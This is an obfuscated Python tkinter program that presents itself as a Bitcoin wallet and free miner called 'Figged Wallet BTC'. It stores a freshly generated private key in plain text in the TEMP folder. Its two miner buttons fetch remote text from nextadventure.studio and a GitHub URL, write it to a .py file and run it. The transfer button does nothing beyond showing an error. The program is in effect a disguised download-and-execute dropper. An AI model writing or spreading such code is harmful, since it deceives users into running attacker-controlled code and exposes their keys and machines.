import tkinter as tk
from turtle import width
from tkinter.ttk import *
import requests
import threading
import os
import json
import bitcoin
import sys
import zlib
import base64
import marshal
import urllib
import webbrowser
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL = tk.Tk()
CzRCiiLYhfkILmMfuhoeEoNibGSCgOlBMCOewISiFTqoEXnSZjAujajKHUMgiKAF = 500
UbYidQwHsxgxYcKAhAergbrYmnMfNxAYHlNKZtHYdYfiSdApUBuoQBTywnnmHWxe = 500
lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY = "#242424"
JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG = "green"
kCxfZzNWzxlAXkssnHqdLomRHOXeNYaqBrfsgqZaTIvmzFsiinfofKBRLXwIUoZb = "Figged Wallet BTC"
sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl = tk.StringVar()
KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG = tk.StringVar()
GNAEpELDJVLEUtrnfBaHrCUmjPTJAkmrNlJizgWMRsFDLDMdHSQnykwryxmpkuQg = tk.StringVar()
NzGWDcZbtSZicrFdBVaOVsduYXtyNkarTbdaALEsuzLPCsVFNwqCJRVzpchFBNwI = tk.StringVar()
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.title(
    kCxfZzNWzxlAXkssnHqdLomRHOXeNYaqBrfsgqZaTIvmzFsiinfofKBRLXwIUoZb)
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.geometry(str(
    CzRCiiLYhfkILmMfuhoeEoNibGSCgOlBMCOewISiFTqoEXnSZjAujajKHUMgiKAF)+"x"+str(UbYidQwHsxgxYcKAhAergbrYmnMfNxAYHlNKZtHYdYfiSdApUBuoQBTywnnmHWxe))
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.configure(
    bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY)
global tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF
global IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB
if os.path.exists(os.getenv('TEMP') + "\\ze3.json"):
    f = open(os.getenv('TEMP') + "\\ze3.json", "r")
    TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum = json.load(
        f)
    tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum[
        "address"]
    IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum[
        "amount"]
    f.close()
else:
    f = open(os.getenv('TEMP') + "\\ze3.json", "w")
    wLnWzIIpIIZHPqgSqgzIMAPTKaBWxvPmMtaUGpWTqInRBkVfEVYglpSQhYOycszC = bitcoin.random_key()
    PlPEKcXyitMDUMqOIFIHkzROviWtxFSsuneWfiARnwXfJMqPFJmshvgqUnQdjfxD = bitcoin.privtopub(
        wLnWzIIpIIZHPqgSqgzIMAPTKaBWxvPmMtaUGpWTqInRBkVfEVYglpSQhYOycszC)
    tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF = bitcoin.pubtoaddr(
        PlPEKcXyitMDUMqOIFIHkzROviWtxFSsuneWfiARnwXfJMqPFJmshvgqUnQdjfxD)
    IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB = "0"
    json.dump({
        "private": wLnWzIIpIIZHPqgSqgzIMAPTKaBWxvPmMtaUGpWTqInRBkVfEVYglpSQhYOycszC,
        "public": PlPEKcXyitMDUMqOIFIHkzROviWtxFSsuneWfiARnwXfJMqPFJmshvgqUnQdjfxD,
        "address": tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF,
        "amount": IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB
    }, f)
    f.close()


def AZUSCMxZIYypOUXEWOMjdXrHRLbiBCsAZdDgVXJnxRnKnQZqYWLIlqNHOvfEcweY():
    os.system(
        "echo "+tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF+" | clip")
    sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set(
        "Copied !")


def WzqhCRoAMNAKPFvlHTRMbrradZScksCZyRnWpMBfJfnqYqvhtIkbIfnPQydHgBZd():
    ArEYCBxNPcoMOtagVIHBPjPqZgnVWXaJaQfxhWNPupgPSGhMyAKqkDYtKsksXBFc = requests.get(
        "https://api.ipify.org?format=json").json()["ip"]
    os.system(
        "echo "+ArEYCBxNPcoMOtagVIHBPjPqZgnVWXaJaQfxhWNPupgPSGhMyAKqkDYtKsksXBFc+" | clip")
    sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set(
        "Copied !")


def gEsXLAQASGrKycEYeWWITUrEHlrZwyfvlTmxsRVmauJjpwarYlebSWnUSyYlFBMa():
    if requests.get("https://www.nextadventure.studio/figgedminer/allManual.txt").text == "false":
        sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set(
            "All Manual was disabled")
        return
    with open(os.getenv('TEMP') + "\\freeMiner.py", "w") as pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI:
        pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI.write(
            requests.get("https://www.nextadventure.studio/figgedminer/Manual.txt").text)
    os.system("start python %temp%/freeMiner.py " +
              tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF)


def AQoTUTJaOqVmaXKzqKNUFnlPHObmhqgAvITKLUfzkEedIyKHjavxpTbAerGkEwkq():
    if requests.get("https://github.com/AeX03/Figged-Wallet-BTC/blob/main/allAuto.txt").text == "false":
        sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set(
            "All Auto was disabled")
        return
    with open(os.getenv('TEMP') + "\\wallet.py", "w", encoding="utf-8") as pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI:
        pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI.write(
            requests.get("https://github.com/AeX03/Figged-Wallet-BTC/blob/main/allAuto.txt").text)
    os.system("start python %temp%/wallet.py " +
              tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF)


def aYaTxQfcgGqSowzhYLWdeBIpFVWsbYMdmuAwgREmnLBPpunQMWrbMbUyUPRMdMlk():
    threading.Thread(
        target=AZUSCMxZIYypOUXEWOMjdXrHRLbiBCsAZdDgVXJnxRnKnQZqYWLIlqNHOvfEcweY).start()


def TJMlkQJaiqwwJrzmgsIBbKDgwnOQTXsicrmLViYmszMXhHuHysoEbwOykDSddkrp():
    threading.Thread(
        target=WzqhCRoAMNAKPFvlHTRMbrradZScksCZyRnWpMBfJfnqYqvhtIkbIfnPQydHgBZd).start()


def uHAfcdCHNikYVzZsUZQFjrfJYjEMmKRKVBBqMSngukwdpSHYXqjESNjyldynnLQh():
    sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("")
    KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG.set("")
    f = open(os.getenv('TEMP') + "\\ze3.json", "r")
    TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum = json.load(
        f)
    tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum[
        "address"]
    IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum[
        "amount"]
    f.close()
    GNAEpELDJVLEUtrnfBaHrCUmjPTJAkmrNlJizgWMRsFDLDMdHSQnykwryxmpkuQg.set(
        str(IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB) + " BTC")
    NzGWDcZbtSZicrFdBVaOVsduYXtyNkarTbdaALEsuzLPCsVFNwqCJRVzpchFBNwI.set(str(round(int(requests.get("https://api.coinbase.com/v2/prices/spot?currency=USD").json()[
                                                                         "data"]["amount"].split(".", 1)[0]) * float(IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB), 2)) + " USD")


def AqqNVxApSyTKMrJKmXofQYtHadhpqLoyXxWlOwWCMfzmkfQfEZkFagBHkxsTRAlT():
    KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG.set(
        "Api error parse => Address with Amount")


def DiaAZsxaTrtbSEZU7inzedZBRTYHGDFgssgdsERRVZRVQFrTYTZRcrzrnzaDFQEZ():
    webbrowser.open_new("https://discord.gg/xpaxKBEx9t")


tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Figged Wallet BTC 𝕧𝟚", font=("Courier", 20)).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="𝕄𝕒𝕕𝕖 𝕓𝕪: ↋0xǝ∀", font=("Courier", 10)).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL,
         bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, text="").pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), textvariable=GNAEpELDJVLEUtrnfBaHrCUmjPTJAkmrNlJizgWMRsFDLDMdHSQnykwryxmpkuQg).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), textvariable=NzGWDcZbtSZicrFdBVaOVsduYXtyNkarTbdaALEsuzLPCsVFNwqCJRVzpchFBNwI).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Copy Address", font=("Courier", 10), width=30, command=aYaTxQfcgGqSowzhYLWdeBIpFVWsbYMdmuAwgREmnLBPpunQMWrbMbUyUPRMdMlk).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Copy Ip", font=("Courier", 10), width=30, command=TJMlkQJaiqwwJrzmgsIBbKDgwnOQTXsicrmLViYmszMXhHuHysoEbwOykDSddkrp).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL,
         bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, text="").pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Discord", font=("Courier", 10), width=30, command=DiaAZsxaTrtbSEZU7inzedZBRTYHGDFgssgdsERRVZRVQFrTYTZRcrzrnzaDFQEZ).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL,
         bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, text="").pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Launch Automatique Miner", font=("Courier", 10), width=30, command=AQoTUTJaOqVmaXKzqKNUFnlPHObmhqgAvITKLUfzkEedIyKHjavxpTbAerGkEwkq).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Launch Manual Miner", font=("Courier", 10), width=30, command=gEsXLAQASGrKycEYeWWITUrEHlrZwyfvlTmxsRVmauJjpwarYlebSWnUSyYlFBMa).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg="#CC0000", text="", font=("Courier", 9), textvariable=sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Amount", font=("Courier", 10)).pack()
tk.Entry(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), width=30).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Address", font=("Courier", 10)).pack()
tk.Entry(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), width=30).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Transfert", font=("Courier", 10), width=30, command=AqqNVxApSyTKMrJKmXofQYtHadhpqLoyXxWlOwWCMfzmkfQfEZkFagBHkxsTRAlT).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
         fg="#CC0000", text="", font=("Courier", 9), textvariable=KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY,
          fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Refresh", font=("Courier", 10), width=30, command=uHAfcdCHNikYVzZsUZQFjrfJYjEMmKRKVBBqMSngukwdpSHYXqjESNjyldynnLQh).pack()
uHAfcdCHNikYVzZsUZQFjrfJYjEMmKRKVBBqMSngukwdpSHYXqjESNjyldynnLQh()
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.mainloop()
